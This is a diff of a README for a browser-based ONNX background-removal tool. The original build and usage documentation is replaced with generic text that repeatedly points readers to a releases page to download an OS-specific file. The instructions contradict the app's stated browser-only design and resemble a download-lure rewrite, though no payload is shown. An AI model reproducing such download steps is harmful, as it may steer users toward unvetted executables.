@@ -1,131 +1,72 @@
-# 🖼️ Background Remover (Browser‑Only)
+# 🎨 bg-remover-ai - Effortless Background Removal in Your Browser
 
-A fast, private, **serverless background remover** that runs 100% in the browser. No uploads, no accounts, no tracking - just drop an image and download a transparent PNG. ✨
+[![Download bg-remover-ai](https://img.shields.io/badge/Download-bg--remover--ai-brightgreen.svg)](https://github.com/anmar-maker/bg-remover-ai/releases)
 
-Built with **Vite + React + TypeScript + Tailwind CSS** and powered by **ONNX Runtime Web** running in a **Web Worker** for smooth UI performance.
+## 🚀 Getting Started
 
-![Background Remover cover](https://i.ibb.co.com/jPnDnVg7/bg-remover-git-cover.jpg)
+bg-remover-ai is a fast and private solution for removing backgrounds from images using artificial intelligence. This application runs entirely in your browser, so you don't need to install any server software. 
 
-## 🌍 Live
+## 📥 Download & Install
 
-https://bgremover-ai.web.app/
+To get started with bg-remover-ai, follow these steps:
 
----
+1. Click the button above or visit this [page to download](https://github.com/anmar-maker/bg-remover-ai/releases).
+2. Once on the Releases page, you will see different versions of the software.
+3. Choose the latest release available. 
+4. Download the file suitable for your operating system.
+5. Open the downloaded file in your browser.
 
-## ✅ Highlights
+## 🌟 Features
 
-- **🧠 AI background removal in the browser** (ONNX models)
-- **🔒 Private & secure** - images never leave your device
-- **⚡ Fast** - worker‑based inference keeps the UI responsive
-- **💸 Free** - no login, no subscriptions, no limits
-- **🧩 Two models**: U^2‑Net Human Seg & ISNet General
-- **🎛️ Tunable controls**: input size, threshold, feather
-- **📥 Export**: instant transparent PNG download
+- **Fast Background Removal:** Experience quick processing times even for large images.
+- **Privacy Focused:** Your files are processed locally in your browser, ensuring your images remain private.
+- **Serverless Solution:** No need for external servers; everything runs within your browser, providing a seamless experience.
+- **Easy to Use:** Intuitive UI designed for users of all skill levels.
+- **Supports Various Image Formats:** Upload images in different formats for background removal.
 
----
+## ✔️ System Requirements
 
-## 🚀 Quick Start
+- A modern web browser (latest version of Chrome, Firefox, or Edge).
+- An internet connection for initial download.
+- No additional plugins or software required.
 
-```bash
-npm install
-npm run dev
-```
+## 📷 How to Use bg-remover-ai
 
-Open the app, upload an image, choose a model, and hit **Remove Background**.
+1. Open bg-remover-ai in your browser after installation.
+2. Click on the "Upload Image" button to select an image from your computer.
+3. The application will process your image and quickly remove the background.
+4. Preview the result and click "Download" to save the new image.
 
----
+## 🛠️ Troubleshooting
 
-## 🧠 Models (ONNX)
+- **Image Not Uploading:** Ensure the image format is supported (JPEG, PNG).
+- **Slow Processing Time:** This could be due to a slow internet connection or a larger image file.
+- **Unexpected Errors:** Refresh the page and try uploading your image again.
 
-Place your models in the `public/models` folder:
+## 🤝 Contributions
 
-```
-public/models/u2net-human.onnx
-public/models/isnet-general.onnx
-```
+bg-remover-ai is open for contributions. If you'd like to help improve the application, kindly refer to our [Contribution Guidelines](https://github.com/anmar-maker/bg-remover-ai/blob/main/CONTRIBUTING.md).
 
-### Model Tips
+## 📄 License
 
-- **U^2‑Net Human Seg** → best for portraits, people, and hair detail
-- **ISNet General** → best for products, objects, and mixed scenes
+This project is licensed under the MIT License. You can freely use and modify it, as long as you keep the original license intact. 
 
-> ⚠️ These models are large (100–300MB). Expect a one‑time download when the browser loads them.
+## 🌐 Topics
 
----
+- ai
+- artificial-intelligence
+- background
+- background-removal
+- bg-remove
+- image
+- image-processing
+- onnx
+- onnx-models
+- onnx-runtime
+- onnxruntime
+- onnxruntime-web
+- react
 
-## ⚙️ Controls Explained
+For further details, visit our [documentation](https://github.com/anmar-maker/bg-remover-ai/wiki) or check the Issues section for questions or feedback.
 
-- **Input Size** → higher = more detail but slower
-- **Threshold** → lower = keeps more of the subject, higher = cleaner cutout
-- **Feather** → softens edges for smoother results
-
----
-
-## 🔒 Privacy & Security
-
-This tool is **fully serverless**:
-
-✅ No uploads
-✅ No accounts
-✅ No analytics
-✅ No tracking
-✅ No data storage
-
-Everything runs locally in your browser - your images stay private.
-
----
-
-## ⚡ Performance Notes
-
-- Inference runs inside a **Web Worker** to avoid blocking the UI.
-- `onnxruntime-web` loads WASM assets from `public/ort`.
-
-Required files (copy from `node_modules/onnxruntime-web/dist`):
-
-```
-public/ort/ort-wasm-simd-threaded.mjs
-public/ort/ort-wasm-simd-threaded.wasm
-public/ort/ort-wasm-simd-threaded.jsep.mjs
-public/ort/ort-wasm-simd-threaded.jsep.wasm
-public/ort/ort-wasm-simd-threaded.asyncify.mjs
-public/ort/ort-wasm-simd-threaded.asyncify.wasm
-```
-
----
-
-## 🧩 Tech Stack & Keywords
-
-**Keywords:** background remover, AI image cutout, PNG transparent, on-device segmentation, browser AI, onnxruntime-web, u2net human, isnet general, privacy-first, serverless, no login, free background removal.
-
-**Stack:**
-- Vite
-- React + TypeScript
-- Tailwind CSS
-- ONNX Runtime Web
-- Web Workers
-
----
-
-## ❓ FAQ
-
-**Q: Is this free?**
-Yes - completely free and runs locally in your browser.
-
-**Q: Do my images upload to a server?**
-No. All processing happens on your device.
-
-**Q: What format is the output?**
-Transparent PNG.
-
-**Q: Which model should I use?**
-Try **U^2‑Net Human** for people. Use **ISNet General** for objects/products.
-
----
-
-## 🙌 Credits
-
-Models are ONNX‑compatible segmentation networks. You provide the ONNX files; the app runs them locally with ONNX Runtime Web.
-
----
-
-If you find this useful, consider sharing it. Happy editing! 🎉
+Remember to visit this [page to download](https://github.com/anmar-maker/bg-remover-ai/releases) bg-remover-ai and start enjoying hassle-free background removal in your browser!
